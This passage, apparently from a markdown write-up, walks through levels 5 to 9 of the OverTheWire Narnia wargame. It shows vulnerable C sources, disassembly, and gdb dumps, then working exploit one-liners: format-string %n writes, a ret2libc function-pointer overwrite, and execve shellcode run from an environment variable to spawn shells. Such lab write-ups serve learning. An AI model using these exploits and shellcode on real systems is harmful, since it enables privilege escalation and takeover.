+0xffffd5d4:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0xffffd5dc:	0x86	0xa2
+```
+I have surrounded with ```[]``` the contents of ```buffer```, as shown by our previous disassembly.
+Now let's continue execution and see what happens with ```snprintf``` if ```argv[1]``` is ```AAAA%08x```.
+```
+gef➤  x/90bx $esp
+                    address of buffer                  sizeof buffer
+0xffffd584:    (0x90	0xd5	0xff	0xff)  (0x40	0x00	0x00	0x00)
+                        argv[1]                     contents of buffer
+0xffffd58c:    (0xd5	0xd7	0xff	0xff)  [0x41	0x41	0x41	0x41
+0xffffd594:	0x34	0x31	0x34	0x31	0x34	0x31	0x34	0x31
+0xffffd59c:	0x00	0x00	0x20	0x00	0x01	0x00	0x00	0x00
+0xffffd5a4:	0x00	0x00	0x00	0x00	0x90	0x08	0xe4	0xf7
+0xffffd5ac:	0x1b	0x86	0x04	0x08	0x02	0x00	0x00	0x00
+0xffffd5b4:	0x74	0xd6	0xff	0xff	0x80	0xd6	0xff	0xff
+0xffffd5bc:	0xf1	0x85	0x04	0x08	0xdc	0x53	0xfc	0xf7
+0xffffd5c4:	0x2c	0x82	0x04	0x08	0xd9	0x85	0x04	0x08
+                                                            i = 1
+0xffffd5cc:	0x00	0x00	0x00	0x00]  (0x01	0x00	0x00	0x00)
+0xffffd5d4:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0xffffd5dc:	0x86	0xa2
+```
+Now our buffer is ```AAAA41414141```. What happened?
+Well, basically we called ```snprintf(buffer, 64, "AAAA%08x");```. The moment the program parses the ```%08x``` it knows it has to do with a format string and needs to print out 8 hex digits from the next parameter. The execution thinks we called ```snprintf(buffer, 64, "AAAA%08x", value);```. So, it would normally look for that value in the next four bytes of the stack and these, at that point, will be our 4 ```A```'s that are stored at the beginning of buffer as ```0x41	0x41	0x41	0x41```. Since we want this as a string, we will obtain "41414141", which in hexa is exactly ```0x34	0x31	0x34	0x31	0x34	0x31	0x34	0x31``` and thus we have overwritten an unintended part of the stack.
+How can we get to ```i```? We can use the ```%n``` format string to get the number of characters printed:
+```
+printf("%500x%2$n, value, &charNo)
+```
+would print us 500 hex digits from ```value``` (if it has less, the rest will be padded with whitespaces (```0x20```)) and store the number of printed characters (due to ```%n```) in the second argument ```charNo```(due to ```2$```).
+So, we can use ```i``` as the argument where to store the number of printed bytes. We can access it by getting its address which, luckily, is nicely printed to us.
+```
+narnia5@narnia:/narnia$ ./narnia5 $(python -c 'print "\x10\xd6\xff\xff" + "%496x%1$n"')
+Change i's value from 1 -> 500. GOOD
+$ whoami
+narnia6
+$ cat /etc/narnia_pass/narnia6
+```
+
+## Level 6 -> 7 ##
+```
+narnia6@narnia:/narnia$ cd /narnia
+narnia6@narnia:/narnia$ cat narnia6.c
+```
+```
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+extern char **environ;
+
+// tired of fixing values...
+// - morla
+unsigned long get_sp(void) {
+       __asm__("movl %esp,%eax\n\t"
+               "and $0xff000000, %eax"
+               );
+}
+
+int main(int argc, char *argv[]){
+	char b1[8], b2[8];
+	int  (*fp)(char *)=(int(*)(char *))&puts, i;
+
+	if(argc!=3){ printf("%s b1 b2\n", argv[0]); exit(-1); }
+
+	/* clear environ */
+	for(i=0; environ[i] != NULL; i++)
+		memset(environ[i], '\0', strlen(environ[i]));
+	/* clear argz    */
+	for(i=3; argv[i] != NULL; i++)
+		memset(argv[i], '\0', strlen(argv[i]));
+
+	strcpy(b1,argv[1]);
+	strcpy(b2,argv[2]);
+	//if(((unsigned long)fp & 0xff000000) == 0xff000000)
+	if(((unsigned long)fp & 0xff000000) == get_sp())
+		exit(-1);
+	setreuid(geteuid(),geteuid());
+    fp(b1);
+
+	exit(1);
+}
+```
+From what we can see it takes two arguments from the command line and we have an overflow from ```b2``` to ```b1```:
+```
+narnia6@narnia:/narnia$ ./narnia6 b1 123456789101112
+9101112
+```
+From the dissassembly, as we can see at the time of the first ```strcpy```, ```b1``` is located at ```ebp - 0x14```
+```
+ 804868f:       8d 45 ec                lea    eax,[ebp-0x14]
+ 8048692:       50                      push   eax
+ 8048693:       e8 88 fd ff ff          call   8048420 <strcpy@plt>
+ ```
+ What is more, ```fp``` is located at ```ebp - 0xc```, as we can see at the time of ```fp(b1)```:
+ ```
+ 80486e4:       8b 45 f4                mov    eax,DWORD PTR [ebp-0xc]
+ 80486e7:       ff d0                   call   eax
+ ```
+ This means we can overflow into ```fp``` with the address of another function, such as ```system```, and obtain a shell! This technique is known as ```ret2libc```.
+
+ Using ```GDB``` we can easily find the address of ```system```:
+ ```
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xf7e4c850 <system>
+```
+Great! Now for our payload:
+```
+narnia6@narnia:/narnia$ ./narnia6 whatever $(python -c 'print "a" * 8 + "/bin/sh;" + "\x50\xc8\xe4\xf7"')
+$ whoami
+narnia7
+$ cat /etc/narnia_pass/narnia7
+```
+
+## Level 7 -> 8 ##
+Alright, this keeps getting more and more complicated.
+```
+narnia7@narnia:~$ cd /narnia
+narnia7@narnia:/narnia$ cat narnia7.c 
+```
+```
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int goodfunction();
+int hackedfunction();
+
+int vuln(const char *format){
+        char buffer[128];
+        int (*ptrf)();
+
+        memset(buffer, 0, sizeof(buffer));
+        printf("goodfunction() = %p\n", goodfunction);
+        printf("hackedfunction() = %p\n\n", hackedfunction);
+
+        ptrf = goodfunction;
+        printf("before : ptrf() = %p (%p)\n", ptrf, &ptrf);
+
+        printf("I guess you want to come to the hackedfunction...\n");
+        sleep(2);
+        ptrf = goodfunction;
+
+        snprintf(buffer, sizeof buffer, format);
+
+        return ptrf();
+}
+
+int main(int argc, char **argv){
+        if (argc <= 1){
+                fprintf(stderr, "Usage: %s <buffer>\n", argv[0]);
+                exit(-1);
+        }
+        exit(vuln(argv[1]));
+}
+
+int goodfunction(){
+        printf("Welcome to the goodfunction, but i said the Hackedfunction..\n");
+        fflush(stdout);
+
+        return 0;
+}
+
+int hackedfunction(){
+        printf("Way to go!!!!");
+	    fflush(stdout);
+        setreuid(geteuid(),geteuid());
+        system("/bin/sh");
+
+        return 0;
+}
+```
+Oh, it looks like the challenge is helping us again by giving away the functions' addresses! Sweet!
+```
+narnia7@narnia:/narnia$ ./narnia7 Give\ me\ the\ addresses,\ please?
+goodfunction() = 0x80486ff
+hackedfunction() = 0x8048724
+
+before : ptrf() = 0x80486ff (0xffffd568)
+I guess you want to come to the hackedfunction...
+Welcome to the goodfunction, but i said the Hackedfunction..
+```
+And, clearly, the obvious overflow here
+```
+        snprintf(buffer, sizeof buffer, format);
+```
+is practically begging us to overflow from ```buffer``` to ```ptrf```, by giving as input a buffer that exploits the same format string vulnerability we met a few levels ago.
+From the disassembly we can get the exact location of ```ptrf```:
+```
+ 80486b5:       8b 85 7c ff ff ff       mov    eax,DWORD PTR [ebp-0x84]
+ 80486bb:       ff d0                   call   eax
+```
+And the location of ```buffer``` from the ```memset``` call from the beginning:
+```
+ 8048624:       68 80 00 00 00          push   0x80
+ 8048629:       6a 00                   push   0x0
+ 804862b:       8d 45 80                lea    eax,[ebp-0x80]
+ 804862e:       50                      push   eax
+ 804862f:       e8 bc fe ff ff          call   80484f0 <memset@plt>
+```
+Let's go ahead and use the same technique, but this time, instead of ```500-4``` let's overwrite it with ```0x8048724 - 4```, which is ```134514464```:
+```
+narnia7@narnia:/narnia$ ./narnia7 $(python -c 'print "\x68\xd5\xff\xff" + "%134514464x%1$n"')
+goodfunction() = 0x80486ff
+hackedfunction() = 0x8048724
+
+before : ptrf() = 0x80486ff (0xffffd568)
+I guess you want to come to the hackedfunction...
+Segmentation fault
+```
+Hmm, it didn't work? Let's analyze the stack frame before the execution of ```snprintf```:
+```
+gef➤  x/90bx $esp
+                      address of buffer             sizeof buffer (128) 
+0xffffd52c:    (0x3c	0xd5	0xff	0xff)  (0x80	0x00	0x00	0x00
+                            format                          fptr
+0xffffd534:    (0xca	0xd7	0xff	0xff)  (0xff	0x86	0x04	0x08)
+                    beginning of buffer
+0xffffd53c:    [0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0xffffd544:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0xffffd54c:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0xffffd554:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0xffffd55c:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0xffffd564:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0xffffd56c:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0xffffd574:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0xffffd57c:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0xffffd584:	0x00	0x00
+```
+Ahh yes! Did you catch the mistake? Since ```buffer``` is located ```AFTER``` ```ptrf```, we can't overwrite the supposed first parameter, but the second! As you can see in the memory dump above, if we were to use ```$1``` we would write at the address deferentiated by ```fptr```, which gives us ```Segmentation Fault```. That's why the fix is ```$2``` instead, so we can write into the buffer deferentiated by the address located in the beginning of ```buffer```, which is exactly the address of ```fptr```! Nice one ```OverTheWire```!
+```
+narnia7@narnia:/narnia$ ./narnia7 $(python -c 'print "\x68\xd5\xff\xff" + "%134514464x%2$n"')
+goodfunction() = 0x80486ff
+hackedfunction() = 0x8048724
+
+before : ptrf() = 0x80486ff (0xffffd568)
+I guess you want to come to the hackedfunction...
+Way to go!!!!$ whoami
+narnia8
+$ cat /etc/narnia_pass/narnia8
+```
+I actually enjoyed thid one! :)
+
+## Level 8 -> 9 ##
+Alright, here we are! The final challenge!
+```
+narnia8@narnia:~$ cd /narnia
+narnia8@narnia:/narnia$ cat narnia8.c
+```
+```
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+// gcc's variable reordering fucked things up
+// to keep the level in its old style i am
+// making "i" global until i find a fix
+// -morla
+int i;
+
+void func(char *b){
+	char *blah=b;
+	char bok[20];
+	//int i=0;
+
+	memset(bok, '\0', sizeof(bok));
+	for(i=0; blah[i] != '\0'; i++)
+		bok[i]=blah[i];
+
+	printf("%s\n",bok);
+}
+
+int main(int argc, char **argv){
+
+	if(argc > 1)
+		func(argv[1]);
+	else
+	printf("%s argument\n", argv[0]);
+
+	return 0;
+}
+narnia8@narnia:/narnia$ ./narnia8
+```
+Interesting comment there :D.
+The only difficult part about this level is knowing how to get over the overflow that would take place after ```i``` surpasses ```sizeof bok``` and starts overwriting the address stored in ```blah```. But, in order to do this, we just have to place there the address of ```argv[1]``` so that basically when overwriting, it wouldn't do a thing to our pointer.
+```
+narnia8@narnia:/narnia$ checksec narnia8
+[*] '/narnia/narnia8'
+    Arch:     i386-32-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x8048000)
+    RWX:      Has RWX segments
+```
+WOHOOO! We don't even have any mitigation enabled. Not having ```NX``` means we are free to use our shellcode! Let's just pass it to a environment variable:
+```
+narnia8@narnia:/narnia$ export EGG=$(echo -en "\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xf1\x89\xf2\x31\xc0\xb0\x0b\xcd\x80")
+```
+Right, now that we have it in our shell's environment we just need to find its address. Let's do that with the following C code:
+```
+narnia8@narnia:/narnia$ vim /tmp/getenv/getegg.c
+```
+```
+#include <stdio.h>                                                                                                
+#include <stdlib.h>
+  
+int main(int argc, char** argv)
+{
+    printf("env address at %p\n", argv[1], getenv(argv[1]));
+    return (0);
+}
+```
+```
+narnia8@narnia:/narnia$ cd /tmp/getenv
+narnia8@narnia:/tmp/getenv$ gcc -m32 -o getegg /tmp/getenv/getegg.c
+narnia8@narnia:/tmp/getenv$ ./getegg EGG
+env address at 0xffffd7e6
+```
+
+Let's also get the address of ```argv[1]```, which, according to the disassembly, is located at ```ebp - 0x4```. While running inside ```GDB```, I've noticed that for each byte my payload increases, the address decreases. So, since our payload will have 20 A's, address of ```argv[1]```, 4 A's as junk for ```ebp``` and ```EGG```'s address, we will have to substract 12!
+Now, let's build our exploit!
+```
+narnia8@narnia:/narnia$ ./narnia8 $(python -c 'print "a" * 20 + "\xdb\xd7\xff\xff" + "a" * 4 + "\xe6\xd7\xff\xff"')
+aaaaaaaaaaaaaaaaaaaa����aaaa��������
+$ whoami
+narnia9
+$ cat /etc/narnia_pass/narnia9
+```
+
+## Level 9 ##
+Congratulations! We have finished this wargame!
+```
+narnia9@narnia:~$ ls
+CONGRATULATIONS
+narnia9@narnia:~$ cat CONGRATULATIONS 
+you are l33t! next plz...
+```
